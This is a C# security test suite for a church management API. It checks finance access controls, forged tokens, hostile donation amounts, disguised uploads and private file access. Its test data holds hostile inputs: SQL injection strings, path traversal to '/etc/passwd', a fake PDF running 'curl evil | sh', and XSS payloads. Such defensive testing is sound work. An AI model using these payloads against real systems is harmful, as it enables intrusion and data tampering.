using System.Net;
using System.Net.Http.Headers;
using System.Net.Http.Json;
using System.Text;
using ChurchSeeker.Domain.Enums;
using ChurchSeeker.Infrastructure.Persistence;
using FluentAssertions;
using Microsoft.EntityFrameworkCore;
using Microsoft.Extensions.DependencyInjection;

namespace ChurchSeeker.BreakTests;

// Phase 3 break tests: money, finance access, disguised uploads, private codices, report abuse.
public class Phase3BreakTests : IClassFixture<BreakFactory>
{
    private readonly BreakFactory _f;
    private static readonly Guid Cathedral = ChurchSeedData.CathedralId;
    private static readonly Guid Jesus = ChurchSeedData.JesusId;
    private static readonly Guid SantaLucia = ChurchSeedData.SantaLuciaId;

    public Phase3BreakTests(BreakFactory f) => _f = f;

    private static StringContent Raw(string json) => new(json, Encoding.UTF8, "application/json");

    private async Task<int> DonationCount(Guid church)
    {
        using var scope = _f.Services.CreateScope();
        var db = scope.ServiceProvider.GetRequiredService<AppDbContext>();
        return await db.Donations.IgnoreQueryFilters().CountAsync(d => d.ChurchId == church);
    }

    private static byte[] Pdf(string extra = "") =>
        Encoding.Latin1.GetBytes($"%PDF-1.4\n1 0 obj\n<< /Type /Catalog {extra} >>\nendobj\ntrailer\n<< /Root 1 0 R >>\n%%EOF\n");

    private static MultipartFormDataContent Form(byte[] file, string fileName, string title = "Libro", bool isPublic = true, string field = "file")
    {
        var form = new MultipartFormDataContent();
        form.Add(new ByteArrayContent(file) { Headers = { ContentType = new MediaTypeHeaderValue("application/pdf") } }, field, fileName);
        form.Add(new StringContent(title), "title");
        form.Add(new StringContent(isPublic.ToString().ToLower()), "isPublic");
        return form;
    }

    // ---- Finance access ---------------------------------------------------------------------------

    private static readonly (HttpMethod Method, string Url)[] FinanceRoutes =
    [
        (HttpMethod.Get, "/api/donations"), (HttpMethod.Post, "/api/donations"), (HttpMethod.Get, "/api/donations/summary/monthly?year=2025"),
        (HttpMethod.Get, "/api/donations/00000000-0000-0000-0000-000000000001"), (HttpMethod.Post, "/api/donations/00000000-0000-0000-0000-000000000001/void"),
        (HttpMethod.Get, "/api/reports/income?format=Pdf&from=2025-01-01&to=2025-12-31")
    ];

    [Theory]
    [InlineData(UserRole.Pastor)]
    [InlineData(UserRole.Secretario)]
    [InlineData(UserRole.Coordinador)]
    public async Task NonFinanceRoles_AreDeniedOnEveryFinanceRoute(UserRole role)
    {
        var c = await _f.UserClient(role, Cathedral, "fin-deny");
        foreach (var (method, url) in FinanceRoutes)
        {
            var req = new HttpRequestMessage(method, url);
            if (method == HttpMethod.Post) req.Content = Raw("{\"date\":\"2025-01-01\",\"amount\":10,\"concept\":\"x\",\"method\":1}");
            (await c.SendAsync(req)).StatusCode.Should().Be(HttpStatusCode.Forbidden, $"{role} {method} {url}");
        }
        var before = await DonationCount(Cathedral);
        (await c.PostAsJsonAsync("/api/donations", new { date = "2025-01-01", amount = 99m, concept = "colado", method = 1 })).StatusCode.Should().Be(HttpStatusCode.Forbidden);
        (await DonationCount(Cathedral)).Should().Be(before);
    }

    [Fact]
    public async Task Anonymous_And_ForgedTokens_AreDeniedOnFinanceRoutes()
    {
        var tokens = new Dictionary<string, string?>
        {
            ["no token"] = null,
            ["wrong key"] = BreakFactory.Mint(role: "Tesorero", key: "attacker-key-attacker-key-attacker-key-00"),
            ["expired"] = BreakFactory.Mint(role: "Tesorero", notBefore: DateTime.UtcNow.AddHours(-2), expires: DateTime.UtcNow.AddMinutes(-1)),
            ["lowercase role"] = BreakFactory.Mint(role: "tesorero"),
            ["role list"] = BreakFactory.Mint(role: "Tesorero,Administrador"),
            ["unknown role"] = BreakFactory.Mint(role: "Finance"),
        };
        foreach (var (why, token) in tokens)
        {
            var c = token is null ? _f.Anonymous() : _f.WithBearer(token);
            var res = await c.GetAsync("/api/donations");
            res.StatusCode.Should().BeOneOf([HttpStatusCode.Unauthorized, HttpStatusCode.Forbidden], why);
        }
    }

    [Fact]
    public async Task Dashboard_NeverLeaksIncome_ToNonFinance_NoMatterWhatTheRequestSays()
    {
        var c = await _f.UserClient(UserRole.Secretario, Cathedral, "dash-leak");
        foreach (var url in new[] { "/api/dashboard", "/api/dashboard?includeIncome=true", "/api/dashboard?role=Tesorero&income=1" })
        {
            var req = new HttpRequestMessage(HttpMethod.Get, url);
            req.Headers.Add("X-Role", "Tesorero");
            req.Headers.Add("X-Forwarded-User", "admin");
            var text = await (await c.SendAsync(req)).Content.ReadAsStringAsync();
            text.Should().NotContainEquivalentOf("income", url);
        }
    }

    // ---- Money abuse ------------------------------------------------------------------------------

    public static IEnumerable<object[]> HostileAmounts() =>
    [
        ["-5000.00"], ["0"], ["-0"], ["0.001"], ["0.005"], ["100000000.01"], ["1e9"], ["1e999"], ["-1e999"],
        ["79228162514264337593543951000"], ["99999999999999999999999999999999999"], ["\"NaN\""], ["\"Infinity\""], ["\"-Infinity\""],
        ["\"1,000\""], ["\"１２３\""], ["\"12.5.3\""], ["\"\""], ["\" \""], ["true"], ["null"], ["{}"], ["[]"], ["\"0x10\""]
    ];

    [Theory]
    [MemberData(nameof(HostileAmounts))]
    public async Task HostileAmounts_AreRejected_AndNothingIsStored(string amount)
    {
        var c = await _f.UserClient(UserRole.Tesorero, Cathedral, "amt" + Math.Abs(amount.GetHashCode()));
        var before = await DonationCount(Cathedral);
        var res = await c.PostAsync("/api/donations", Raw($"{{\"date\":\"2025-05-04\",\"amount\":{amount},\"concept\":\"x\",\"method\":1}}"));
        ((int)res.StatusCode).Should().BeInRange(400, 499, amount);
        (await DonationCount(Cathedral)).Should().Be(before, "no row may be written for a rejected amount");
    }

    [Fact]
    public async Task ParallelDonations_SumExactly_NoServerErrors()
    {
        var c = await _f.UserClient(UserRole.Tesorero, Jesus, "par-don");
        var results = await Task.WhenAll(Enumerable.Range(0, 40).Select(_ =>
            c.PostAsJsonAsync("/api/donations", new { date = "2024-08-15", amount = 0.10m, concept = "paralela", method = 1 })));
        results.Should().OnlyContain(r => (int)r.StatusCode < 500);
        var created = results.Count(r => r.StatusCode == HttpStatusCode.Created);

        var summary = await BreakFactory.ReadJson(await c.GetAsync("/api/donations/summary/monthly?year=2024"));
        var august = summary[7];
        august.GetProperty("count").GetInt32().Should().Be(created);
        august.GetProperty("total").GetDecimal().Should().Be(created * 0.10m, "no float drift, no lost or duplicated rows");
    }

    [Fact]
    public async Task ParallelVoids_AreIdempotent_AndTotalsStayConsistent()
    {
        var c = await _f.UserClient(UserRole.Tesorero, SantaLucia, "par-void");
        var keep = (await BreakFactory.ReadJson(await c.PostAsJsonAsync("/api/donations", new { date = "2024-09-01", amount = 50m, concept = "k", method = 1 }))).GetProperty("id").GetGuid();
        var drop = (await BreakFactory.ReadJson(await c.PostAsJsonAsync("/api/donations", new { date = "2024-09-02", amount = 70m, concept = "d", method = 1 }))).GetProperty("id").GetGuid();

        var results = await Task.WhenAll(Enumerable.Range(0, 10).Select(_ => c.PostAsync($"/api/donations/{drop}/void", null)));
        results.Should().OnlyContain(r => (int)r.StatusCode < 500);
        var page = await BreakFactory.ReadJson(await c.GetAsync("/api/donations?from=2024-09-01&to=2024-09-30"));
        page.GetProperty("total").GetInt32().Should().Be(1);
        page.GetProperty("totalAmount").GetDecimal().Should().Be(50m);
        (await c.GetAsync($"/api/donations/{keep}")).StatusCode.Should().Be(HttpStatusCode.OK);
    }

    [Fact]
    public async Task DonationFilters_AreSafeAgainstInjectionAndGarbage()
    {
        var c = await _f.UserClient(UserRole.Tesorero, Cathedral, "don-fuzz");
        foreach (var q in new[] { "method=1;DROP TABLE Donations", "method=999", "method=-1", "anonymous=maybe", "from='%20OR%201=1--", "page=-9&pageSize=0",
                                  "pageSize=2147483647", "includeVoided=%00", "from=2025-02-30", "to=99999-01-01" })
            ((int)(await c.GetAsync("/api/donations?" + q)).StatusCode).Should().BeLessThan(500, q);
        (await c.GetAsync("/api/donations")).StatusCode.Should().Be(HttpStatusCode.OK);
    }

    // ---- Disguised uploads ---------------------------------------------------------------------------

    public static IEnumerable<object[]> FakePdfs() =>
    [
        ["exe", new byte[] { 0x4D, 0x5A, 0x90, 0, 3, 0, 0, 0, 4, 0, 0, 0, 0xFF, 0xFF, 0, 0, 0xB8, 0 }, "libro_sagrado.pdf"],
        ["elf", new byte[] { 0x7F, 0x45, 0x4C, 0x46, 2, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 3, 0 }, "libro.pdf"],
        ["zip", new byte[] { 0x50, 0x4B, 3, 4, 20, 0, 0, 0, 8, 0, 0, 0, 0, 0, 0, 0, 0, 0 }, "libro.pdf"],
        ["shell", Encoding.ASCII.GetBytes("#!/bin/sh\ncurl evil | sh\n"), "libro.pdf"],
        ["html", Encoding.ASCII.GetBytes("<!doctype html><script>fetch('/api/donations')</script>"), "libro.pdf"],
        ["svg", Encoding.ASCII.GetBytes("<svg xmlns='http://www.w3.org/2000/svg' onload='alert(1)'/>"), "libro.pdf"],
        ["pdf header only", Encoding.ASCII.GetBytes("%PDF-1.4 MZ\x90\0\x03 payload without a proper ending      "), "libro.pdf"],
        ["pdf prefix then exe", Encoding.Latin1.GetBytes("%PDF-1.4\n").Concat(new byte[] { 0x4D, 0x5A, 0x90, 0 }).ToArray(), "libro.pdf"],
        ["null bytes", new byte[64], "libro.pdf"],
        ["double extension exe", new byte[] { 0x4D, 0x5A, 0x90, 0, 3, 0, 0, 0, 4, 0, 0, 0, 0xFF, 0xFF, 0, 0 }, "libro.pdf.exe"],
    ];

    [Theory]
    [MemberData(nameof(FakePdfs))]
    public async Task DisguisedFiles_AreRejectedByContent(string why, byte[] bytes, string name)
    {
        var c = await _f.UserClient(UserRole.Secretario, Cathedral, "fake" + Math.Abs(why.GetHashCode()));
        var before = Directory.Exists(Path.Combine(_f.StorageRoot, "book")) ? Directory.GetFiles(Path.Combine(_f.StorageRoot, "book")).Length : 0;
        (await c.PostAsync("/api/books", Form(bytes, name))).StatusCode.Should().Be(HttpStatusCode.BadRequest, why);
        var after = Directory.Exists(Path.Combine(_f.StorageRoot, "book")) ? Directory.GetFiles(Path.Combine(_f.StorageRoot, "book")).Length : 0;
        after.Should().Be(before, why);
    }

    [Fact]
    public async Task HugeFileRenamedAsPdf_IsRejected_WithoutBeingStored()
    {
        var c = await _f.UserClient(UserRole.Secretario, Cathedral, "huge");
        var huge = new byte[40 * 1024 * 1024];
        Encoding.ASCII.GetBytes("%PDF-1.4\n").CopyTo(huge, 0);
        Encoding.ASCII.GetBytes("\n%%EOF\n").CopyTo(huge, huge.Length - 8);
        ((int)(await c.PostAsync("/api/books", Form(huge, "libro_sagrado.pdf"))).StatusCode).Should().BeInRange(400, 413);
        var dir = Path.Combine(_f.StorageRoot, "book");
        (!Directory.Exists(dir) || Directory.GetFiles(dir).All(p => new FileInfo(p).Length < 1_000_000)).Should().BeTrue();
    }

    [Fact]
    public async Task MultipartTricks_NeverCause5xx()
    {
        var c = await _f.UserClient(UserRole.Secretario, Cathedral, "multi");
        var twoFiles = Form(Pdf(), "a.pdf");
        twoFiles.Add(new ByteArrayContent(Pdf()), "file", "b.pdf");
        var manyFields = Form(Pdf(), "ok.pdf");
        for (var i = 0; i < 3000; i++) manyFields.Add(new StringContent("x"), "junk" + i);
        var hugeTitle = Form(Pdf(), "ok.pdf", title: new string('t', 2_000_000));
        var noName = new MultipartFormDataContent { { new ByteArrayContent(Pdf()), "file" }, { new StringContent("Sin nombre"), "title" } };
        var wrongType = new StringContent("{\"title\":\"x\"}", Encoding.UTF8, "application/json");

        foreach (var (why, content) in new (string, HttpContent)[] { ("two files", twoFiles), ("3000 fields", manyFields), ("2MB title", hugeTitle), ("no filename", noName), ("json instead", wrongType) })
        {
            var res = await c.PostAsync("/api/books", content);
            ((int)res.StatusCode).Should().BeLessThan(500, why);
        }
    }

    [Fact]
    public async Task ChurchProfile_IgnoresMassAssignment_OfFilePathsAndFlags()
    {
        var admin = await _f.UserClient(UserRole.Administrador, SantaLucia, "mass");
        var json = "{\"name\":\"Santa Lucía\",\"denomination\":\"Católica\",\"patronSaint\":\"Santa Lucía\",\"address\":\"Calle 60\",\"latitude\":20.97,\"longitude\":-89.62,\"schedules\":[],"
                 + "\"id\":\"11111111-1111-1111-1111-111111111111\",\"logoFile\":\"../../../etc/passwd\",\"modelFile\":\"..\\\\..\\\\evil.glb\",\"isActive\":false,\"modelPath\":\"//evil.example/x.glb\"}";
        (await admin.PutAsync("/api/church", Raw(json))).StatusCode.Should().Be(HttpStatusCode.OK);

        var mine = await BreakFactory.ReadJson(await admin.GetAsync("/api/church"));
        mine.GetProperty("id").GetGuid().Should().Be(SantaLucia);
        (mine.GetProperty("logoUrl").ValueKind == System.Text.Json.JsonValueKind.Null).Should().BeTrue();
        mine.GetProperty("modelUrl").GetString().Should().NotContain("evil");
        (await _f.Anonymous().GetAsync($"/api/public/churches/{SantaLucia}")).StatusCode.Should().Be(HttpStatusCode.OK, "isActive must not be flippable");
        (await _f.Anonymous().GetAsync($"/api/public/churches/{Cathedral}")).StatusCode.Should().Be(HttpStatusCode.OK);
    }

    // ---- Private codices -----------------------------------------------------------------------------

    [Fact]
    public async Task PrivatePdf_IsUnreachableWithoutSession_ByEveryTrick()
    {
        var sec = await _f.UserClient(UserRole.Secretario, Cathedral, "priv");
        var id = (await BreakFactory.ReadJson(await sec.PostAsync("/api/books", Form(Pdf(), "privado.pdf", "SOLO-PERSONAL", isPublic: false)))).GetProperty("id").GetGuid();
        var anon = _f.Anonymous();

        var urls = new[]
        {
            $"/api/public/churches/{Cathedral}/books/{id}/file",
            $"/api/public/churches/{Cathedral}/books/{id}/file/",
            $"/api/public/churches/{Cathedral}/books/{id}/file?download=1&public=true",
            $"/api/public/churches/{Cathedral}/books/{id}/file/../../books",
            $"/api/public/churches/{Jesus}/books/{id}/file",
            $"/api/books/{id}/file",
            $"/api/books/{id}",
        };
        foreach (var url in urls)
        {
            foreach (var method in new[] { HttpMethod.Get, HttpMethod.Head })
            {
                var req = new HttpRequestMessage(method, url);
                req.Headers.Add("Range", "bytes=0-100");
                req.Headers.Add("X-HTTP-Method-Override", "GET");
                var res = await anon.SendAsync(req);
                res.StatusCode.Should().BeOneOf([HttpStatusCode.NotFound, HttpStatusCode.Unauthorized, HttpStatusCode.MethodNotAllowed], $"{method} {url}");
                (await res.Content.ReadAsByteArrayAsync()).Take(5).Should().NotEqual("%PDF-"u8.ToArray());
            }
        }
        (await anon.GetStringAsync($"/api/public/churches/{Cathedral}/books")).Should().NotContain("SOLO-PERSONAL");
    }

    [Fact]
    public async Task PrivatePdf_OfAnotherChurch_StaysPrivate_EvenForStaff()
    {
        var a = await _f.UserClient(UserRole.Secretario, Cathedral, "priv-a");
        var b = await _f.UserClient(UserRole.Administrador, Jesus, "priv-b");
        var id = (await BreakFactory.ReadJson(await a.PostAsync("/api/books", Form(Pdf(), "p.pdf", "SECRETO-A", isPublic: false)))).GetProperty("id").GetGuid();
        (await b.GetAsync($"/api/books/{id}/file")).StatusCode.Should().Be(HttpStatusCode.NotFound);
        (await b.GetAsync($"/api/public/churches/{Cathedral}/books/{id}/file")).StatusCode.Should().Be(HttpStatusCode.NotFound);
        (await b.GetStringAsync($"/api/public/churches/{Cathedral}/books")).Should().NotContain("SECRETO-A");
        (await b.GetStringAsync("/api/books")).Should().NotContain("SECRETO-A");
    }

    // ---- Report abuse -----------------------------------------------------------------------------------

    [Fact]
    public async Task ReportHammering_HitsTheRateLimit()
    {
        var c = await _f.UserClient(UserRole.Administrador, SantaLucia, "hammer");
        var codes = new List<HttpStatusCode>();
        for (var i = 0; i < 30; i++) codes.Add((await c.GetAsync("/api/reports/ministries?format=Xlsx")).StatusCode);
        codes.Should().Contain(HttpStatusCode.TooManyRequests);
        codes.Should().OnlyContain(s => s == HttpStatusCode.OK || s == HttpStatusCode.TooManyRequests);
    }

    [Theory]
    [InlineData("/api/reports/members?format=Pdf%00")]
    [InlineData("/api/reports/members?format=' OR 1=1--")]
    [InlineData("/api/reports/attendance?format=Pdf&from='; DROP TABLE Events;--&to=2025-01-01")]
    [InlineData("/api/reports/attendance?format=Pdf&eventId=not-a-guid")]
    [InlineData("/api/reports/income?format=Xlsx&from=0001-01-01&to=9999-12-31")]
    [InlineData("/api/reports/members?format=Pdf&active=%00")]
    [InlineData("/api/reports/../donations")]
    public async Task ReportQueries_WithHostileInput_NeverBecome5xx(string url)
    {
        var c = await _f.UserClient(UserRole.Administrador, Cathedral, "rq" + Math.Abs(url.GetHashCode()));
        ((int)(await c.GetAsync(url)).StatusCode).Should().BeLessThan(500, url);
    }

    [Fact]
    public async Task AttendanceReport_ForAnotherChurchsEvent_Is404()
    {
        var a = await _f.UserClient(UserRole.Secretario, Cathedral, "rep-a");
        var b = await _f.UserClient(UserRole.Secretario, Jesus, "rep-b");
        var ev = (await BreakFactory.ReadJson(await a.PostAsJsonAsync("/api/events", new { title = "Evento A", date = "2024-01-07", time = "10:00:00", location = "Nave", kind = 1 }))).GetProperty("id").GetGuid();
        (await b.GetAsync($"/api/reports/attendance?format=Xlsx&eventId={ev}")).StatusCode.Should().Be(HttpStatusCode.NotFound);
    }
}
